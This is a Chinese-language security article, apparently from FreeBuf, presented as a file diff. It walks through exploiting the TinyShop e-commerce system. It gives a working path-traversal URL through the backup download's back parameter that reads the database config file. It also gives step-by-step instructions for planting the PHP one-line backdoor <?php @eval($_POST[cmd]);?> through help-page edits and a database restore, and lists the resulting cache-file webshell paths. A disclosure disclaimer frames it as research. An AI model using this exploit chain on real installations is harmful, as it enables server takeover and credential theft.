@@ -1,0 +1,105 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+*本文原创作者simeon，属于FreeBuf原创奖励计划，禁止转载
+TinyShop是一款电子商务系统（网店系统），适合企业及个人快速构建个性化网上商店。系统是基于Tiny（自主研发）框架开发的，使系统更加的安全、快捷、稳定、高性能。
+1.1.1下载及安装
+1.下载地址
+http://www.tinyrise.org/down.html
+2.安装
+在本地先安装一个php+mysql的环境，然后将TinyShop压缩包解压到网站根目录，访问http://localhost/tinyshop/install/index.php根据提示进行设置即可，如图1所示，需要设置数据库名称、密码和管理员密码，数据库表前缀可以使用默认的，也可以自定义设置，后续按照提示进行安装即可。
+图1安装TinyShop
+3.管理及重要信息
+（1）TinyShop后台管理地址http://localhost/tinyshop/index.php?con=admin&act=login，输入admin和设置的密码admin888进行登录。
+（2）数据库管理员表名称为tiny_manager
+（3）数据库配置文件/protected/config/config.php。
+4.TinyShop商城系统的用户密码加密方式
+（1）查看管理员密码
+打开数据库中的tiny_manager表，如图2所示，“dqrvRY*`”为validcode值，密码值为：96601e27d0bcd9dce06f95e55df40a6c。
+图2管理密码值
+（2）管理员密码计算方式
+以密码的验证码（validcode）为“dqrvRY*`”,密码明文为“admin888”为例
+md5（dqrvRY*`）=96601e27d0bcd9dce06f95e55df40a6c
+取前16位“96601e27d0bcd9dc”，和后16位“e06f95e55df40a6c”，与明文密码组合成登录密码“96601e27d0bcd9dc”+“admin”+”e06f95e55df40a6c”,
+然后返回“96601e27d0bcd9dcadmin888e06f95e55df40a6c”的32位小写md5也即数据库表中的password=md5（96601e27d0bcd9dcadmin888e06f95e55df40a6c）=7c2160f89a2fecff792522553004acb1，如图3所示，可以通过在线网站https://md5jiami.51240.com/直接查询其32为md5值。
+图3在线查询md5密码
+（3）php加密函数
+/** * @brief调用系统的MD5散列方式 * @param String $str * @return String */ public static functionmd5x($str,$validcode=false) { if($validcode){ $key = md5($validcode); $str =substr($key,0,16).$str.substr($key,16,16); } returnmd5($str); }
+通过分析知道即使tinyshop使用最简单的123456，获取的密码是32+6=38位字符串加密，直接暴力破解的成功率非常低。这也是md5变异加密，增强其安全性的一种实际应用。
+1.1.2文件包含漏洞挖掘及利用
+1.文件包含漏洞
+（1）备份数据库
+登录后台系统后，单击“系统设置”-“数据库管理”-“数据库备份”全选数据库后进行备份，成功备份后，在“数据库还原”-“处理”-“下载”中可以获取文件下载地址，如图4所示。其具体地址为：
+http://localhost/tinyshop/index.php?con=admin&act=down&back=2017122522_5673_1936.sql
+图4获取数据库备份文件下载地址
+（2）获取文件包含漏洞
+在数据库下载url中发现有一个back参数，直接将该参数替换成数据库配置文件地址../../protected/config/config.php，即可下载，如图5所示，其exp为：
+http://localhost/tinyshop/index.php?con=admin&act=down&back=../../protected/config/config.php，back参数可以换成网站存在的任意文件进行下载，通过下载数据库配置文件可以获取数据库配置信息。
+图5本地文件包含漏洞
+function back_list() { $database_path =Tiny::getPath('database'); $files =glob($database_path . '*.sql'); $this->assign('files',$files); $database_url =Tiny::getPath('database_url'); $this->assign("database_url",$database_url); $this->redirect(); } //备份下载操作 function down() { $database_path =Tiny::getPath('database'); $backs =Req::args("back"); Http::download($database_path.$backs,$backs);
+1.1.3缓存文件获取webshell
+1. tinyshop v2.4缓存文件分析
+对其cache存在的php文件进行分析，其帮助文件对应模块整理如下：
+(1)积分制度、账户注册和购物流程
+对应文件夹：cache/593/924/，文件名称为107.php ，网站访问地址：
+http://192.168.127.130/tinyshop_2.x/cache/593/924/107.php
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=6积分制度
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=3账户注册
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=5购物流程
+(2)配送范围
+对应文件夹：cache/325/532/，文件名称为5862.php ，网站访问地址：
+http://192.168.127.130/tinyshop_2.x/cache/325/532/5862.php
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=7配送范围
+(3)余额支付
+对应文件夹：cache/986/324/，文件名称为752.php ，网站访问地址：
+http://192.168.127.130/tinyshop_2.x/cache/986/324/752.php
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=8余额支付
+(4)退款说明、售后保障
+对应文件夹：cache/118/562/，文件名称为682.php ，网站访问地址：
+http://192.168.127.130/tinyshop_2.x/cache/118/562/682.php
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=9退款说明
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=13售后保障
+(5)联系客服、找回密码、常见问题、用户注册协议
+对应文件夹：cache/368/501/，文件名称为4461.php ，网站访问地址：
+http://192.168.127.130/tinyshop_2.x/cache/368/501/4461.php
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=10联系客服
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=11找回密码
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=12常见问题
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=14用户注册协议
+注意：这里的模块在选择编辑内容后，对应在缓存中生成文件，该文件用于后续webshell的获取，也就该文件为webshell的实际地址。
+2.tinyshopv3.0版本
+在tinyshop v3.0起cache中仅仅对5862.php和6827.php文件名称进行了变更，起具体地址如下：
+http://192.168.127.130/tinyshop_3.0/cache/593/924/107.php
+http://192.168.127.130/tinyshop_3.0/cache/986/324/752.php
+http://192.168.127.130/tinyshop_3.0/cache/368/501/4461.php
+http://192.168.127.130/tinyshop_3.0/cache/325/532/5862.php
+http://192.168.127.130/tinyshop_3.0/cache/118/562/6827.php
+3.获取Webshell方法
+（1）单击cms系统中的“内容管理”-“全部帮助”，单击任意一条记录，选择编辑该记录，在其内容中添加一句话后门代码<?php @eval($_POST[cmd]);?>并保存，如图6所示。
+图6插入一句话后门
+（2）备份数据库中的帮助表
+单击“系统设置”-“数据库备份”在数据库表中选择包含help的表，在本例中为tiny_help的表，如图7所示，选择后在数据库备份中进行备份。
+图7备份tiny_help表
+（3）下载备份的数据库表sql文件
+如图8所示，系统会自动对备份的文件进行命名，选中后单击处理，将其下载到本地，3.0版本中已经修补了数据库文件包含这个漏洞。
+图8下载备份的mysql文件
+（4）修改mysql文件
+图9修改sql文件中的代码
+（5）上传sql文件进行数据库还原
+在后台中，单击“系统设置”-“数据库还原”-“导入”，选择已经修改过的sql文件，如图10所示，选择“上传”，文件上传后会自动还原数据库。
+图10自动上传并还原数据库
+（6）清理缓存
+单击“系统设置”-“安全管理”-“清除缓存”，选择清除所有缓存。
+（7）访问页面
+在浏览器中随机访问其帮助文件中的列表，例如“用户注册协议”的地址为：
+http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=14
+（8）获取webshell
+对v30版本来说其shell地址为模块对应文件地址：
+http://192.168.127.130/tinyshop_3.0/cache/593/924/107.php
+http://192.168.127.130/tinyshop_3.0/cache/986/324/752.php
+http://192.168.127.130/tinyshop_3.0/cache/368/501/4461.php
+http://192.168.127.130/tinyshop_3.0/cache/325/532/5862.php
+http://192.168.127.130/tinyshop_3.0/cache/118/562/6827.php
+v2.0将前面“tinyshop v2.4缓存文件分析”，也就修改“用户注册协议”，则对应shell地址：http://192.168.127.130/tinyshop_2.x/cache/368/501/4461.php
+如图11所示成功获取wesbhell，后面对全部帮助中的条目进行测试，发现所有输入都可以获取webshell，如图12所示，其ID对应webshell插入代码的详细情况。
+图11获取webshell
+图12ID对应相应的一句话后门
+*本文原创作者simeon，属于FreeBuf原创奖励计划，禁止转载
